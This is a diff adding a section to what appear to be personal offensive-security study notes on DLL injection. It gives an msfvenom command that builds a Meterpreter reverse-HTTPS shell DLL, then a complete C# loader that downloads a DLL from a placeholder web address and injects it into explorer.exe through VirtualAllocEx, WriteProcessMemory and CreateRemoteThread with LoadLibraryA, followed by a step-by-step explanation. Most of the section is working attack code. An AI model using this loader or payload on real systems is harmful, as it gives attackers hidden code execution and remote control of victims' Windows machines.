@@ -204,3 +204,97 @@ Explanation :
 # DLL Injection
 
 ## DLL Injection Theory
+
+- To use an API from a DLL, we have to use the LoadLibrary API to load the dll onto the virtual memory space.
+- The LoadLibraryA module takes in only only argument which is the name of the dll.
+- Function prototype of LoadLibraryA :
+
+  HMODULE LoadLibraryA(
+  LPCSTR lpLibFileName
+  );
+
+- LoadLibrary caannot be invoked on remote processes, but our workaround to this problem is that we'll resolve it's address using the _GetProcAddress_ and _GetModuleHandle_. Since the native windows DLLs are allocated same base address across processes, so the address of LoadLibraryA would be same for our current and remote process.
+- We can then pass this address along with the allocated dll as the argument
+
+&nbsp;
+
+## DLL Injection in C#
+
+MSFVENOM Payload :
+
+    sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<IP> LPORT=<PORT> -f dll -o shell.dll
+
+Final Code :
+
+    using System;
+    using System.Diagnostics;
+    using System.Net;
+    using System.Runtime.InteropServices;
+    using System.Text;
+
+    namespace Inject
+    {
+        class Program
+        {
+            [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+            static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
+
+            [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+            static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+            [DllImport("kernel32.dll")]
+            static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
+
+            [DllImport("kernel32.dll")]
+            static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+            [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
+            static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+            [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
+            public static extern IntPtr GetModuleHandle(string lpModuleName);
+
+            static void Main(string[] args)
+            {
+                String dir = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
+                String dllName = dir + "\\shell.dll";
+                WebClient wc = new WebClient();
+                wc.DownloadFile("<Hosted DLL web address>", dllName);
+                Process[] expProc = Process.GetProcessesByName("explorer");
+                int pid = expProc[0].Id;
+                IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
+                IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
+                IntPtr outSize;
+                Boolean res = WriteProcessMemory(hProcess, addr, Encoding.Default.GetBytes(dllName), dllName.Length, out outSize);
+                IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
+                IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, addr, 0, IntPtr.Zero);
+            }
+        }
+    }
+
+&nbsp;
+
+Explanation :
+
+- We first import the System and interop namespaces to interact with the win32 APIs and System classes
+- We then define a namespace called Inject followed by a class called Program inside this namespace.
+- This is follwed by the Pinvoke statements to load the required Win32 APIs
+- We then specify the Main method inside which our code is written.
+- We get the Full system path of Document folder and store it in the dir variable.
+- We then store the name of the dll with its complete path in dllName
+- Next is to download the hosted DLL and save it to this file
+- To get the process ID of explorer, we use the GetProcessByName and then extract it's ID from that.
+- We then open a new process to explorer using _OpenProcess_
+- Using _VirtualAllocEx_ we can allocate a space in this remote process.
+- We write the dll into this handle using the _WriteProcessMemory_ API. We encode the dll before writing it in.
+- Using _GetProcAddress_ and _GetModuleHandle_ we can get the address of the LoadLibraryA.
+- We then create a remote thread, but this time we pass the address of the LoadLibraryA and the dll as it's argument. This way we can execute a dll in a remote process.
+
+&nbsp;
+
+> Documentation :
+>
+> - https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya
+> - https://codingvision.net/c-inject-a-dll-into-a-process-w-createremotethread
+
+&nbsp;
